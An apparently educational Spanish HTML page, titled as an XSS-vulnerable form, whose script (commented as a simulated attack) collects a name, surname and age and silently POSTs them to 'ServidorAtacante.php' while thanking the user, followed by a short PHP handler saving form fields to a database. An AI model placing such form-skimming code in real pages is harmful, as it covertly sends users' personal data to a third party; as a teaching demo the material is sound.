<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Formulario vulnerable a XSS</title>
  <style>
    body {
      font-family: "Georgia",serif;
      background-color:rgb(125, 125, 125);
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    form {
      background-color: rgba(200, 187, 187, 0.89);
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }

    label, input {
      display: block;
      width: 100%;
      margin-bottom: 12px;
    }

    input {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-family: "Georgia", serif;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color:rgb(171, 31, 0);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-family: "Georgia", serif;
    }

    button:hover {
      background-color:rgba(250, 0, 0, 0.91);
    }
  </style>
</head>
<body>
  <form id="datosForm">
    <h2>Formulario de Datos</h2>
    <label for="nombre">Nombre:</label>
    <input type="text" name="nombre" id="nombre">

    <label for="apellido">Apellido:</label>
    <input type="text" name="apellido" id="apellido">

    <label for="edad">Edad:</label>
    <input type="number" name="edad" id="edad">

    <button type="submit">Enviar</button>
  </form>
  <script>
    // Código simula un ataque XSS: toma datos y los envía a otro archivo (servidor externo)
    document.getElementById("datosForm").addEventListener("submit", function(e) {
      e.preventDefault(); // Evita que el formulario se envíe normalmente

      // Aquí simulamos el robo de datos por XSS
      const nombre = document.getElementById("nombre").value;
      const apellido = document.getElementById("apellido").value;
      const edad = document.getElementById("edad").value;

      const datosRobados = `Nombre=${nombre}, Apellido=${apellido}, Edad=${edad}\n`;

     
      fetch("ServidorAtacante.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "datos=" + encodeURIComponent(datosRobados)
      });

      alert("Gracias por enviar tus datos.");
    });
  </script>
</body>
</html>



<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $apellido = $_POST["apellido"];
    $edad = $_POST["edad"];
    $conexion = new ConexionBD();
    $conexion->guardarDatos($nombre, $apellido, $edad);
    header("Location: FORMULARIO_USUARIOS.php");
    exit();
}
?>